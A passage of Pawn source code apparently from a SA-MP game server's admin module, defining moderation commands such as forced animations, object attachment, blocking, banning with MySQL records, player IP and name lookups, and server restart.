		SendCommandMessageToAdmins(playerid, "forceanim", 4);
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_forcesanim(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcesanim <name|id/all> <anim cmd from /sahelp>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (!strlen(params[strlen(tmps2)+1]))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcesanim <name|id/all> <anim cmd from /sahelp>");

	if (!strcmp(tmps2, "all", true))
	{
 		if (!strlen(params[strlen(tmps2)+1]))
	    return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcesanim <name|id/all> <anim cmd from /sahelp>");

 		format(strings, sizeof(strings), "/%s",params[strlen(tmps2)+1]);
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
		    if (IsPlayerConnected(i) && !IsPlayerNPC(i))
		    CallRemoteFunction("ApplyAnimationForPlayer2", "is", i, strings);
		}
		SendCommandMessageToAdmins(playerid, "forcesanim");
		return 1;
	}

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
 		if (giveplayerid == playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You can't force yourself");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN] || IsPlayerNPC(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	    format(strings, sizeof(strings), "/%s",params[strlen(tmps2)+1]);
	    CallRemoteFunction("ApplyAnimationForPlayer2", "is", giveplayerid, strings);
		SendCommandMessageToAdmins(playerid, "forcesanim");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_forceseat(playerid,params[])
{
    new idx;

	if (!IsPlayerInAnyVehicle(playerid))
	return SendClientMessage(playerid, COLOR_DARKRED, "You must be in a vehicle");

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forceseat <name|id> <seatID>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (!strlen(params[strlen(tmps2)+1]))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forceseat <name|id> <seatID>");

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
 		if (giveplayerid == playerid)
	    return SendClientMessage(playerid, COLOR_WHITE, "You can't force yourself");

		if (!IsPlayerSpawned(giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "This player didn't spawn yet.");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN] || !IsPlayerAdminLevel(playerid, 5) && IsPlayerNPC(giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE , "This player has higher priveleges than you. Action cancelled.");

		new vID = GetPlayerVehicleID(playerid);
		if (RCVehicles(vID))
		return SendErrorMessage(playerid, EMBED_WHITE, "RC Vehicles are disabled with forceseat.");

		if (strlen(params[strlen(tmps2)+1]) && !strcmp(params[strlen(tmps2)+1], "out", true))
		{
			player[giveplayerid][antifall] = 0;
   			GetPlayerPos(giveplayerid, playerxyza[0], playerxyza[1], playerxyza[2]);
   			SetPlayerPos(giveplayerid, playerxyza[0], playerxyza[1], playerxyza[2]+2);
  			SendCommandMessageToAdmins(playerid, "forceseat out");
	    	return 1;
		}

   		/*for (new i = 0; i < MAX_PLAYERS; i++)
		{
	 		if (IsPlayerConnected(i) && GetPlayerVehicleID(giveplayerid) == GetPlayerVehicleID(i))
		    {
				if (IsPlayerDriver(i) && strfind(params[strlen(tmps2)+1], "0", true) != -1)
				return SendClientMessage(playerid, COLOR_DARKRED, "Another player is driving the vehicle this player is in");
			}
		}*/

		new Float:X,
		 	Float:Y,
		 	Float:Z;

		GetPlayerPos(playerid, X, Y, Z);
		SetPlayerPos(giveplayerid, X, Y, Z+15);
		SetPlayerVirtualWorld(giveplayerid, GetPlayerVirtualWorld(playerid));
	    PutPlayerInVehicle(giveplayerid, vID, strval(params[strlen(tmps2)+1]));
		SendCommandMessageToAdmins(playerid, "forceseat");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_forcepostick(playerid,params[])
{
	new idx,
		targetid = -2,
	    boneid,
		modelid2,
		Float:X,
	 	Float:Y,
	 	Float:Z,
	 	Float:rX,
	 	Float:rY,
	 	Float:rZ,
	 	Float:sX = 1.0,
	 	Float:sY = 1.0,
	 	Float:sZ = 1.0,
	 	freeid;

	strings = strtok(params, idx);
	if (strlen(strings))
	{
	    if (!strcmp(strings, "all", true))
	    {
		    targetid = -1;
		    goto next;
		}

		if (!IsNumeric(strings)) targetid = ReturnPlayerID(strings);
		else targetid = strval(strings);

		if (!IsPlayerConnected(targetid) || targetid == INVALID_PLAYER_ID)
		return SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");

		if (targetid == playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You can't force yourself");
	} else return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /forcepostick <playerid/all> <objectid> <boneid> (OFFSET_x y z) (ROTATION_rx ry rz) (SCALE_sx ry rz)");
	next:

	strings = strtok(params, idx);
	if (!strlen(strings))
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /forcepostick <playerid/all> <objectid> <boneid> (OFFSET_x y z) (ROTATION_rx ry rz) (SCALE_sx ry rz)");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "BoneIDs: 1 Spine; 2 Head; 3 Left upper arm; 4 Right upper arm; 5 Left hand; 6 Right hand; 7 Left thigh; 8 Right thigh; 9 Left foot;");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "10 Right foot; 11 Right calf; 12 Left calf; 13 Left forearm; 14 Right forearm; 15 Left clavicle; 16 Right clavicle; 17 Neck; 18 Jaw;");
		return 1;
	}
	modelid2 = strval(strings);

	strings = strtok(params, idx);
	if (!strlen(strings) || strval(strings) < 1 || strval(strings) > 18 || !IsNumeric(strings))
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /forcepostick <playerid/all> <objectid> <boneid> (OFFSET_x y z) (ROTATION_rx ry rz) (SCALE_sx ry rz)");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "BoneIDs: 1 Spine; 2 Head; 3 Left upper arm; 4 Right upper arm; 5 Left hand; 6 Right hand; 7 Left thigh; 8 Right thigh; 9 Left foot;");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "10 Right foot; 11 Right calf; 12 Left calf; 13 Left forearm; 14 Right forearm; 15 Left clavicle; 16 Right clavicle; 17 Neck; 18 Jaw;");
		return 1;
	}
	boneid = strval(strings);

	if (!IsValidModel(modelid2) || modelid2 == 362)
	return SendErrorMessage(playerid, EMBED_WHITE, "The model ID you supplied doesn't seem to be valid!");

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	X = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	Y = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	Z = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	rX = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	rY = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	rZ = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	{
		sX = floatstr(strings);

		strings = strtok(params, idx);
		if (strlen(strings) || IsNumeric(strings))
		sY = floatstr(strings);

		strings = strtok(params, idx);
		if (strlen(strings) || IsNumeric(strings))
		sZ = floatstr(strings);

		if (sX < 0 || sX > VIP_MAX_SCALE || sY < 0 || sY > VIP_MAX_SCALE || sZ < 0 || sZ > VIP_MAX_SCALE)
		return SendErrorMessage(playerid, EMBED_WHITE, "You have reached the scaling limit (min. 0.0 - max. 100.0).");
	}

	if (targetid == -1) // all players
	{
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
		    if (IsPlayerConnected(i))
		    {
				if (player[i][postickc] >= VIP_MAX_POSTICKS) continue;
				else player[i][postickc]++;

				for (new e = 0; e < VIP_MAX_POSTICKS; e++)
				{
					if (!IsPlayerAttachedObjectSlotUsed(i, e))
					{
						pAObject[i][e][ao_model]	= modelid2;
						pAObject[i][e][ao_bone]		= boneid;
						pAObject[i][e][ao_x]		= X;
						pAObject[i][e][ao_y]		= Y;
						pAObject[i][e][ao_z]		= Z;
						pAObject[i][e][ao_rx]		= rX;
						pAObject[i][e][ao_ry]		= rY;
						pAObject[i][e][ao_rz]		= rZ;
						pAObject[i][e][ao_sx]		= sX;
						pAObject[i][e][ao_sy]		= sY;
						pAObject[i][e][ao_sz]		= sZ;
						freeid = e;
						break;
					}
			 	}
				SetPlayerAttachedObject(i, freeid, modelid2, boneid, X, Y, Z, rX, rY, rZ, sX, sY, sZ);
		    }
		}
		SendCommandMessageToAdmins(playerid, "forcepostick");
		return 1;
	}

	if (player[playerid][ADMIN] < player[targetid][ADMIN] || IsPlayerNPC(targetid))
	return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	if (player[targetid][postickc] >= VIP_MAX_POSTICKS)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player has reached the postick limit.");
	player[targetid][postickc]++;

	for (new e = 0; e < VIP_MAX_POSTICKS; e++)
	{
		if (!IsPlayerAttachedObjectSlotUsed(targetid, e))
		{
			pAObject[targetid][e][ao_model]	= modelid2;
			pAObject[targetid][e][ao_bone]	= boneid;
			pAObject[targetid][e][ao_x]		= X;
			pAObject[targetid][e][ao_y]		= Y;
			pAObject[targetid][e][ao_z]		= Z;
			pAObject[targetid][e][ao_rx]	= rX;
			pAObject[targetid][e][ao_ry]	= rY;
			pAObject[targetid][e][ao_rz]	= rZ;
			pAObject[targetid][e][ao_sx]	= sX;
			pAObject[targetid][e][ao_sy]	= sY;
			pAObject[targetid][e][ao_sz]	= sZ;
			freeid = e;
			break;
		}
 	}
	SetPlayerAttachedObject(targetid, freeid, modelid2, boneid, X, Y, Z, rX, rY, rZ, sX, sY, sZ);
	SendCommandMessageToAdmins(playerid, "forcepostick");
	return 1;
}

dcmd_forcepostick2(playerid,params[])
{
	new idx,
	    Float:range,
	    boneid,
		modelid2,
		Float:X,
	 	Float:Y,
	 	Float:Z,
	 	Float:rX,
	 	Float:rY,
	 	Float:rZ,
	 	Float:sX = 1.0,
	 	Float:sY = 1.0,
	 	Float:sZ = 1.0,
	 	freeid;

	strings = strtok(params, idx);
	range = strval(strings);
	if (!strlen(strings) || range < 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /forcepostick2 <range> <objectid> <boneid> (OFFSET_x y z) (ROTATION_rx ry rz) (SCALE_sx ry rz)");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "BoneIDs: 1 Spine; 2 Head; 3 Left upper arm; 4 Right upper arm; 5 Left hand; 6 Right hand; 7 Left thigh; 8 Right thigh; 9 Left foot;");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "10 Right foot; 11 Right calf; 12 Left calf; 13 Left forearm; 14 Right forearm; 15 Left clavicle; 16 Right clavicle; 17 Neck; 18 Jaw;");
		return 1;
	}

	strings = strtok(params, idx);
	if (!strlen(strings))
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /forcepostick2 <range> <objectid> <boneid> (OFFSET_x y z) (ROTATION_rx ry rz) (SCALE_sx ry rz)");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "BoneIDs: 1 Spine; 2 Head; 3 Left upper arm; 4 Right upper arm; 5 Left hand; 6 Right hand; 7 Left thigh; 8 Right thigh; 9 Left foot;");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "10 Right foot; 11 Right calf; 12 Left calf; 13 Left forearm; 14 Right forearm; 15 Left clavicle; 16 Right clavicle; 17 Neck; 18 Jaw;");
		return 1;
	}
	modelid2 = strval(strings);

	strings = strtok(params, idx);
	if (!strlen(strings) || strval(strings) < 1 || strval(strings) > 18 || !IsNumeric(strings))
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /forcepostick2 <range> <objectid> <boneid> (OFFSET_x y z) (ROTATION_rx ry rz) (SCALE_sx ry rz)");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "BoneIDs: 1 Spine; 2 Head; 3 Left upper arm; 4 Right upper arm; 5 Left hand; 6 Right hand; 7 Left thigh; 8 Right thigh; 9 Left foot;");
		SendClientMessage(playerid, COLOR_MEDIUMAQUA, "10 Right foot; 11 Right calf; 12 Left calf; 13 Left forearm; 14 Right forearm; 15 Left clavicle; 16 Right clavicle; 17 Neck; 18 Jaw;");
		return 1;
	}
	boneid = strval(strings);

	if (!IsValidModel(modelid2) || modelid2 == 362)
	return SendErrorMessage(playerid, EMBED_WHITE, "The model ID you supplied doesn't seem to be valid!");

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	X = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	Y = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	Z = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	rX = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	rY = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	rZ = floatstr(strings);

	strings = strtok(params, idx);
	if (strlen(strings) || IsNumeric(strings))
	{
		sX = floatstr(strings);

		strings = strtok(params, idx);
		if (strlen(strings) || IsNumeric(strings))
		sY = floatstr(strings);

		strings = strtok(params, idx);
		if (strlen(strings) || IsNumeric(strings))
		sZ = floatstr(strings);

		if (sX < 0 || sX > VIP_MAX_SCALE || sY < 0 || sY > VIP_MAX_SCALE || sZ < 0 || sZ > VIP_MAX_SCALE)
		return SendErrorMessage(playerid, EMBED_WHITE, "You have reached the scaling limit (min. 0.0 - max. 100.0).");
	}

	GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
	for (new i = 0; i < MAX_PLAYERS; i++)
	{
	    if (IsPlayerConnected(i))
	    {
		    if (IsPlayerInRangeOfPoint(i, range, playerxyza[0], playerxyza[1], playerxyza[2]))
		    {
				if (player[i][postickc] >= VIP_MAX_POSTICKS) continue;
				else player[i][postickc]++;

				for (new e = 0; e < VIP_MAX_POSTICKS; e++)
				{
					if (!IsPlayerAttachedObjectSlotUsed(i, e))
					{
						pAObject[i][e][ao_model]	= modelid2;
						pAObject[i][e][ao_bone]		= boneid;
						pAObject[i][e][ao_x]		= X;
						pAObject[i][e][ao_y]		= Y;
						pAObject[i][e][ao_z]		= Z;
						pAObject[i][e][ao_rx]		= rX;
						pAObject[i][e][ao_ry]		= rY;
						pAObject[i][e][ao_rz]		= rZ;
						pAObject[i][e][ao_sx]		= sX;
						pAObject[i][e][ao_sy]		= sY;
						pAObject[i][e][ao_sz]		= sZ;
						freeid = e;
						break;
					}
			 	}
				SetPlayerAttachedObject(i, freeid, modelid2, boneid, X, Y, Z, rX, rY, rZ, sX, sY, sZ);
			}
	    }
	}
	SendCommandMessageToAdmins(playerid, "forcepostick2");
	return 1;
}

dcmd_block(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /block <name|id>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
	    if (giveplayerid == playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You can't block yourself");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN])
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

		if (player[giveplayerid][blocked] == 1)
		return SendErrorMessage(playerid, EMBED_WHITE, "This player is already blocked.");

		player[giveplayerid][blocked] = 1;
		GetPlayerName(playerid, playername, sizeof(playername));
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		format(strings, sizeof(strings), "Admin %s has blocked %s (id: %d).", playername, giveplayername, giveplayerid);
		SendMessageToAdmins(COLOR_LLBLUE, strings, 1);
		format(strings, sizeof(strings), "12Admin %s has blocked %s (id: %d).", playername, giveplayername, giveplayerid);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		SendCommandMessageToAdmins(playerid, "block");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_unblock(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /unblock <name|id>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (player[giveplayerid][blocked] == 0)
		return SendErrorMessage(playerid, EMBED_WHITE, "This player is not blocked.");

		player[giveplayerid][blocked] = 0;
		GetPlayerName(playerid, playername, sizeof(playername));
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		format(strings, sizeof(strings), "Admin %s has unbblocked %s (id: %d).", playername, giveplayername, giveplayerid);
		SendMessageToAdmins(COLOR_LLBLUE, strings, 1);
		format(strings, sizeof(strings), "12Admin %s has unbblocked %s (id: %d).", playername, giveplayername, giveplayerid);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		SendCommandMessageToAdmins(playerid, "unblock");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_ban(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /ban <name|id> <reason>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (giveplayerid == playerid)
	return SendErrorMessage(playerid, EMBED_WHITE, "You can't ban yourself!");

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN] || IsPlayerNPC(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	    if (!player[giveplayerid][RULEStextdraw])
		{
			TextDrawShowForPlayer(giveplayerid, nrules);
			player[giveplayerid][RULEStextdraw] = 1;
	    }

		GetPlayerName(playerid, playername, sizeof(playername));
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));

		if (player[playerid][hideadmin] == 1)
		{
			if (!strlen(params[strlen(tmps2)+1]))
			{
				if (!IsPlayerAdminLevel(playerid, 5))
				return SendErrorMessage(playerid, EMBED_WHITE, "Enter a valid reason.");

				if (IsVIP(giveplayerid) && !IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "VIP %s (id: %d) has been banned from the server.", giveplayername, giveplayerid);
				else if (IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "Admin %s (id: %d) has been banned from the server.", giveplayername, giveplayerid);
				else format(tmps1, sizeof(tmps1), "%s (id: %d) has been banned from the server.", giveplayername, giveplayerid);
			} else {
				if (IsVIP(giveplayerid) && !IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "VIP %s (id: %d) has been banned from the server. (Reason: %s)", giveplayername, giveplayerid, params[strlen(tmps2)+1]);
				else if (IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "Admin %s (id: %d) has been banned from the server. (Reason: %s)", giveplayername, giveplayerid, params[strlen(tmps2)+1]);
				else format(tmps1, sizeof(tmps1), "%s (id: %d) has been banned from the server. (Reason: %s)", giveplayername, giveplayerid, params[strlen(tmps2)+1]);
			}
			
			SendServerMessageToAll(EMBED_RED, tmps1);
			format(ircstring, sizeof(ircstring), "by %s", playername);
			SendMessageToAdmins(COLOR_RED, ircstring, 4);
			format(ircstring, sizeof(ircstring), "4,1%s by %s", tmps1, playername);
			IRC_GroupSay(1, IRCOP_CHANNEL, ircstring);
			printflog("ADM-MSG", ircstring);
		} else {
			if (!strlen(params[strlen(tmps2)+1]))
			{
				if (!IsPlayerAdminLevel(playerid, 5))
				return SendErrorMessage(playerid, EMBED_WHITE, "Enter a valid reason.");

				if (IsVIP(giveplayerid) && !IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "Admin %s banned VIP %s (id: %d) from the server.", playername, giveplayername, giveplayerid);
				else if (IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "Admin %s banned admin %s (id: %d) from the server.", playername, giveplayername, giveplayerid);
				else format(tmps1, sizeof(tmps1), "Admin %s banned %s (id: %d) from the server.", playername, giveplayername, giveplayerid);
			} else {
				if (IsVIP(giveplayerid) && !IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "Admin %s banned VIP %s (id: %d) from the server. (Reason: %s)", playername, giveplayername, giveplayerid, params[strlen(tmps2)+1]);
				else if (IsAdmin(giveplayerid)) format(tmps1, sizeof(tmps1), "Admin %s banned admin %s (id: %d) from the server. (Reason: %s)", playername, giveplayername, giveplayerid, params[strlen(tmps2)+1]);
				else format(tmps1, sizeof(tmps1), "Admin %s banned %s (id: %d) from the server. (Reason: %s)", playername, giveplayername, giveplayerid, params[strlen(tmps2)+1]);
			}

			SendServerMessageToAll(EMBED_RED, tmps1);
			printflog("ADM-MSG", tmps1);
			format(ircstring, sizeof(ircstring), "4,1%s", tmps1);
			IRC_GroupSay(1, IRC_CHANNEL, ircstring);
		}

		getdate(year, month, day);
		gettime(hour, minute, second);

		new mysqlStr[533];
		if (IsPlayerRegistered(giveplayerid) && IsPlayerLoggedIn(giveplayerid))
		{
			format(mysqlStr, sizeof(mysqlStr), "UPDATE accounts, player_logs, preferences SET accounts.account_vip = 0, accounts.account_admin = 0, player_logs.player_log_ban_count = player_logs.player_log_ban_count +1, preferences.preference_hide = 0 WHERE accounts.account_id = %d AND player_logs.account_id = %d AND preferences.account_id = %d", player[giveplayerid][accountid], player[giveplayerid][accountid], player[giveplayerid][accountid]);
			mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
		}

		new ban_date[11],
		    ban_time[9],
			ban_ip[16];

		format(ban_date, sizeof(ban_date), "%d-%02d-%02d", year, month, day);
		format(ban_time, sizeof(ban_time), "%02d:%02d:%02d", hour, minute, second);
		GetPlayerIp(giveplayerid, ban_ip, sizeof(ban_ip));
		mysql_real_escape_string(giveplayername, giveplayername);
		mysql_real_escape_string(params, params);

		if (!strlen(params[strlen(tmps2)+1])) format(mysqlStr, sizeof(mysqlStr), "INSERT INTO "MYSQL_TABLE_BANS" (account_id, ban_ip, ban_name, ban_reason, ban_issue_date, ban_issue_time, ban_expire_date, ban_expire_time, admin_id) VALUES(%d, '%s', '%s', 'No reason specified', '%s', '%s', '0000-00-00', '00:00:00', %d)", player[giveplayerid][accountid], ban_ip, giveplayername, ban_date, ban_time, GetPlayerAccountID(playerid));
		else format(mysqlStr, sizeof(mysqlStr), "INSERT INTO "MYSQL_TABLE_BANS" (account_id, ban_ip, ban_name, ban_reason, ban_issue_date, ban_issue_time, ban_expire_date, ban_expire_time, admin_id) VALUES(%d, '%s', '%s', '%s', '%s', '%s', '0000-00-00', '00:00:00', %d)", player[giveplayerid][accountid], ban_ip, giveplayername, params[strlen(tmps2)+1], ban_date, ban_time, GetPlayerAccountID(playerid));
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

		format(tmps2, sizeof(tmps2), "You have been banned by admin %s. [Date: %d/%02d/%d Time: %02d:%02d]", playername, day, month, year, hour, minute);
		SendClientMessage(giveplayerid, COLOR_SEAGREEN, tmps2);
		SendClientMessage(giveplayerid, COLOR_ORANGE, "-> IF YOU WISH TO APPEAL THIS BAN, YOU *MUST* TAKE A SCREENSHOT NOW. (F8)");
		SendClientMessage(giveplayerid, COLOR_ORANGE, "-> Follow the instructions in the Ban Appeals forum, giving as much detail as you possibly can.");
		SendClientMessage(giveplayerid, COLOR_ORANGE, "www.xmovieserver.com");
		BanEx(giveplayerid, tmps1);
		SendCommandMessageToAdmins(playerid, "ban");
		
		//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_bans) VALUES (CURDATE(), 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_bans` = server_statistic_bans +1", false, "", "");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_info(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /info <name/id> [If player offline: use exact full name]");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
		rdns(playerip, giveplayerid+(MAX_PLAYERS*2));
	} else {
		new mysqlStr[106];
		
		mysql_real_escape_string(tmps2, tmps2);
	 	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_IPS" WHERE `ip_name` = '%s' ORDER BY `ip_connect_date` DESC", tmps2);
		mysql_run_query(mysqlConnection, mysqlStr, true, "QS_CheckPlayerInfo", "ii", playerid, player[playerid][cinc]);
	}
	return 1;
}

dcmd_ipmatch(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (strlen(tmps2) < 5)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /ipmatch <ip>");

    new mysqlStr[81];
    
	mysql_real_escape_string(tmps2, tmps2);
 	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_IPS" WHERE `ip_connect_ip` LIKE '%s%%'", tmps2);
	mysql_run_query(mysqlConnection, mysqlStr, true, "QS_CheckPlayerIpMatch", "iis", playerid, player[playerid][cinc], tmps2);
	return 1;
}

dcmd_hostmatch(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (strlen(tmps2) < 5)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /hostmatch <host>");

	new mysqlStr[119];
	
	mysql_real_escape_string(tmps2, tmps2);
 	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_IPS" WHERE `ip_connect_host` LIKE '%%%s%%'", tmps2);
	mysql_run_query(mysqlConnection, mysqlStr, true, "QS_CheckPlayerHostMatch", "iis", playerid, player[playerid][cinc], tmps2);
	return 1;
}

dcmd_namematch(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (strlen(tmps2) < 3)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /namematch <name>");

    new mysqlStr[81];
    
	mysql_real_escape_string(tmps2, tmps2);
 	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_IPS" WHERE `ip_name` LIKE '%%%s%%'", tmps2);
	mysql_run_query(mysqlConnection, mysqlStr, true, "QS_CheckPlayerNameMatch", "iis", playerid, player[playerid][cinc], tmps2);
	return 1;
}

dcmd_namematch2(playerid,params[])
{
    new idx;

	tmps2 = strtok(params, idx);
 	if (strlen(tmps2) < 3)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /namematch2 <name>");

    new mysqlStr[79];
    
	mysql_real_escape_string(tmps2, tmps2);
 	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_IPS" WHERE `ip_name` LIKE '%s%%'", tmps2);
	mysql_run_query(mysqlConnection, mysqlStr, true, "QS_CheckPlayerNameMatch", "iis", playerid, player[playerid][cinc], tmps2);
	return 1;
}

dcmd_gmx(playerid,params[])
{
	#pragma unused params

	StopDerby();
	StopRR();
	StopCC();
	StopNB();
	StopWarzone();

	SendClientMessageToAll(COLOR_LIGHTBLUE, "[INFO] The server is restarting, please hold a few seconds.");
	IRC_GroupSay(1, IRC_CHANNEL, "9,1[INFO] The server is restarting, please hold a few seconds.");
    SendCommandMessageToAdmins(playerid, "gmx");

	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i) && IsPlayerLoggedIn(i))
		{
		    new mysqlStr[82];
	     	format(mysqlStr, sizeof(mysqlStr), "SELECT * FROM "MYSQL_TABLE_PLAYER_LOGS" WHERE `account_id` = %d LIMIT 1", player[i][accountid]);
	  		mysql_run_query(mysqlConnection, mysqlStr, true, "QS_LogPlayerSession", "ii", i, player[i][accountid]);
	    }
    }

	gmxinprogress = true;
    SetTimer("LoadGMX", 5000, 0);
	return 1;
}

forward LoadGMX();
public LoadGMX()
{
	SendRconCommand("gmx");
	return 1;
}

dcmd_poo(playerid,params[])
{
	#pragma unused params

	if (IsPlayerInAnyVehicle(playerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "You cannot drop poo inside the car (eww)");

	if (poo != -1)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[INFO]: Poo was already dropped... Destroying old pickup.");
    	DestroyPickup(poo);
